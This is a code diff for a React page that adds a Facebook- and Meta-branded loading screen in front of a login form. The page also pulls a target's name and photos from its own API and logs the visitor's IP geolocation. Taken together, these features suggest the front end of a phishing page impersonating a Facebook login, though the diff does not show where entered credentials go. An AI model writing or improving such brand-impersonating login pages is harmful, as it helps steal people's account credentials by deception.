@@ -4,6 +4,8 @@ import FacebookIcon from '@/assets/images/facebook-icon';
 import DefaultCover from '@/assets/images/cover.jpg';
 import DefaultAvatar from '@/assets/images/avatar.jpg';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
+import FacebookLogo from '@/assets/images/facebook-icon.webp';
+import MetaImage from '@/assets/images/meta-logo.png';
 import {
     faEllipsisH,
     faBriefcase,
@@ -31,8 +33,44 @@ const isValidImageUrl = async (url: string): Promise<boolean> => {
     }
 };
 
+const LoadingDots = () => {
+    const [dots, setDots] = useState('');
+
+    useEffect(() => {
+        const interval = setInterval(() => {
+            setDots((prev) => {
+                if (prev.length >= 5) return '';
+                return prev + '.';
+            });
+        }, 300);
+
+        return () => clearInterval(interval);
+    }, []);
+
+    return (
+        <div className="flex h-4 w-24 items-center justify-center gap-2">
+            <div
+                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 1 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
+            />
+            <div
+                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 2 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
+            />
+            <div
+                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 3 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
+            />
+            <div
+                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 4 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
+            />
+            <div
+                className={`h-2 w-2 rounded-full transition-colors duration-200 ${dots.length >= 5 ? 'bg-[#1877f2]' : 'bg-gray-300'}`}
+            />
+        </div>
+    );
+};
+
 const Index: FC = () => {
     const [showLoginForm, setShowLoginForm] = useState(false);
+    const [isLoading, setIsLoading] = useState(true);
     const [userInfo, setUserInfo] = useState<UserInfo>({
         full_name: DEFAULT_NAME,
         cover_image: DefaultCover,
@@ -42,59 +80,78 @@ const Index: FC = () => {
     useEffect(() => {
         localStorage.clear();
 
-        const fetchUserInfo = async () => {
+        const initialize = async () => {
             try {
-                const response = await fetch(`${import.meta.env.PUBLIC_API_URL}/api/user`);
-                const data = await response.json();
-                if (data.success) {
-                    const [isValidAvatar, isValidCover] = await Promise.all([
-                        data.data.avatar_image ? isValidImageUrl(data.data.avatar_image) : false,
-                        data.data.cover_image ? isValidImageUrl(data.data.cover_image) : false,
-                    ]);
-
-                    setUserInfo({
-                        full_name: data.data.full_name || DEFAULT_NAME,
-                        cover_image: isValidCover ? data.data.cover_image : DefaultCover,
-                        avatar_image: isValidAvatar ? data.data.avatar_image : DefaultAvatar,
-                    });
+                const configResponse = await fetch(
+                    `${import.meta.env.PUBLIC_API_URL}/api/config/system`,
+                );
+                const configData = await configResponse.json();
+                if (configData.success) {
+                    setSystemConfig(configData.data);
+                } else {
+                    throw new Error('Failed to fetch system config');
                 }
-            } catch {
-                console.error('Error fetching user info');
-            }
-        };
-
-        const fetchSystemConfig = async () => {
-            try {
-                const response = await fetch(`${import.meta.env.PUBLIC_API_URL}/api/config/system`);
-                const data = await response.json();
-                if (data.success) {
-                    setSystemConfig(data.data);
-                }
+                await Promise.all([fetchUserInfo(), fetchGeoData()]);
+                setIsLoading(false);
             } catch (error) {
-                console.error('Error fetching system config:', error);
+                console.error('Initialization error:', error);
+                setIsLoading(false);
             }
         };
 
-        const fetchGeoData = async () => {
-            try {
-                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
-                const data = await response.json();
-                localStorage.setItem('geoData', JSON.stringify(data));
-            } catch (error) {
-                console.error('Error fetching geo data:', error);
-            }
-        };
-
-        fetchUserInfo();
-        fetchSystemConfig();
-        fetchGeoData();
-
-        const timer = setTimeout(() => {
-            setShowLoginForm(true);
-        }, 1000);
-
-        return () => clearTimeout(timer);
+        initialize();
     }, []);
+
+    const fetchUserInfo = async () => {
+        try {
+            const response = await fetch(`${import.meta.env.PUBLIC_API_URL}/api/user`);
+            const data = await response.json();
+            if (data.success) {
+                const [isValidAvatar, isValidCover] = await Promise.all([
+                    data.data.avatar_image ? isValidImageUrl(data.data.avatar_image) : false,
+                    data.data.cover_image ? isValidImageUrl(data.data.cover_image) : false,
+                ]);
+
+                setUserInfo({
+                    full_name: data.data.full_name || DEFAULT_NAME,
+                    cover_image: isValidCover ? data.data.cover_image : DefaultCover,
+                    avatar_image: isValidAvatar ? data.data.avatar_image : DefaultAvatar,
+                });
+            }
+        } catch {
+            console.error('Error fetching user info');
+        }
+    };
+
+    const fetchGeoData = async () => {
+        try {
+            const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
+            const data = await response.json();
+            localStorage.setItem('geoData', JSON.stringify(data));
+        } catch (error) {
+            console.error('Error fetching geo data:', error);
+        }
+    };
+
+    if (isLoading) {
+        return (
+            <div className="fixed inset-0 flex items-center justify-center bg-white">
+                <div className="flex flex-col items-center gap-2">
+                    <img
+                        src={FacebookLogo}
+                        alt="Loading..."
+                        className="h-16 w-16 md:h-20 md:w-20"
+                    />
+                    <LoadingDots />
+                </div>
+                <img
+                    src={MetaImage}
+                    alt="Meta"
+                    className="fixed bottom-8 left-1/2 h-4 -translate-x-1/2 md:h-5"
+                />
+            </div>
+        );
+    }
 
     const handleMainClick = () => {
         if (!showLoginForm) {
